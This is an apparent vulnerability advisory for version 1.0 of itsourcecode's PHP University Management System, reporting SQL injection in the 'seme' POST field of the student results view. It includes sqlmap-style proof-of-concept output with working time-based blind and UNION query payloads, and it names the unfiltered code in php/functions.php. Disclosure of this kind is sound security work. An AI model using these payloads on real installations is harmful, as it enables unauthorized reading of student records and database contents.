
# Vendor

itsourcecode

# Product

University Management System

# version

1.0

Download Source Code: https://itsourcecode.com/wp-content/uploads/2022/01/University-Management-System-Project-In-PHP-Source-Code.zip

# Description
Register and log in with a student account, and in the student account's backend, visit "/view_single_result.php?vr=123321&vn=mirage," where "vr" refers to the StudentID and "vn" to the student's name. Click the "view Result" button. There is an SQL injection vulnerability in the "seme" field of the POST data packet sent.

POC：
#-------------------------------------------------
Parameter: seme (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: seme=1st' AND (SELECT 4900 FROM (SELECT(SLEEP(5)))IWYu) AND 'sLik'='sLik

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: seme=1st' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b7a7171,0x424b4d66785475486669785141445a6a4e4f72774d675543446e585856446d686c56674b58685a57,0x7176767871),NULL-- -
#-------------------------------------------------
<img width="1668" alt="image" src="https://github.com/user-attachments/assets/e9b2bc29-552d-4374-9779-4a5b47de76c1">

# Analysis
In the php/functions.php page, the '$stid' field has not been subjected to strict filtering, resulting in a SQL injection vulnerability.

<img width="1070" alt="image" src="https://github.com/user-attachments/assets/650d4e48-1d67-4c93-a322-a93986ae7e55">
<img width="1441" alt="image" src="https://github.com/user-attachments/assets/7f2ee7ce-5332-450f-adfd-da58233d2801">

